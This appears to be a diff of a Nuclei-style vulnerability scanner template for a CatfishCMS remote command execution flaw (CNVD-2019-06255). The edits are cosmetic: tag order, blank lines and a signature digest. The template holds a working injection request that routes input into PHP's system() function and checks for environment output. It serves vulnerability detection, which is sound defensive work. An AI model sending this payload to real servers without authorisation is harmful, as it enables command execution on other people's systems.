@@ -1,5 +1,4 @@
 id: CNVD-2019-06255
-
 info:
   name: CatfishCMS - Remote Command Execution
   author: Lark-Lab
@@ -16,24 +15,20 @@ info:
     cwe-id: CWE-77
   metadata:
     max-request: 2
-  tags: cnvd,cnvd2019,rce,catfishcms,vuln
+  tags: catfishcms,cnvd,cnvd2019,rce,vuln
 flow: http(1) && http(2)
-
 http:
   - method: GET
     path:
       - "{{BaseURL}}"
-
     matchers:
       - type: word
         internal: true
         words:
           - 'content="Catfish CMS'
-
   - method: GET
     path:
       - "{{BaseURL}}/s=set&_method=__construct&method=*&filter[]=system"
-
     matchers-condition: and
     matchers:
       - type: word
@@ -43,8 +38,7 @@ http:
           - 'SHELL'
           - 'USER'
         condition: and
-
       - type: status
         status:
           - 200
-
+        # digest: 490a0046304402200bb88a78ef06722f43bbe1a1157a1ae7d17bac371f2a1abc12d2902ab5e977ec022070adc044cb4038e6d63456af8c7a9b62766ac6709ebe29db1ac6e34e90813636:922c64590222798bb761d5b6d8e72950
